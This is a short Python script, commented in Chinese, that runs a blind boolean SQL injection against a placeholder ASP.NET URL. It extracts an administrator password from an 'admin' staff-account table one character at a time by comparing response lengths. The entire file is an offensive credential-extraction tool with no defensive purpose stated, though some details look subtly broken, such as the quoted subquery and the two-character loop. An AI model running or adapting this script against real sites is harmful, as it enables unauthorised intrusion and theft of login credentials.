# coding=utf-8
import sys
import requests
import re
import binascii
from termcolor import *
import optparse

url='http://xxx.aspx?i=10'
payloads='abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.'
results='';
response=requests.get(url)
length = response.headers['content-length']
print (colored("true length: "+length,"green",attrs=["bold"])) #termcolor 绿 加粗
for i in range(1,3):
	for payload in payloads:
		#payload_url="' and (select top 1 asc(mid(password,{},1)) from admin)={} and '1'='1 ".format(i,ord(payload))  #ord 返回ascii码值
		payload_url="and ASCII(substring('(select top 1 密码 from admin_员工帐号管理 where 密码 not in (select top 0 密码 from admin_员工帐号管理)',{},1))={}".format(i,ord(payload))
		#print (payload)
		response=requests.get(url+payload_url)
		length_now = response.headers['content-length']
		#print (colored("now length: "+length_now,"green",attrs=["bold"]))
		if length_now==length:
			results=results+payload
			break;
	print (colored("result:"+results,"yellow",attrs=["bold"]))

print (colored("over ---","green",attrs=["bold"]))

	

	







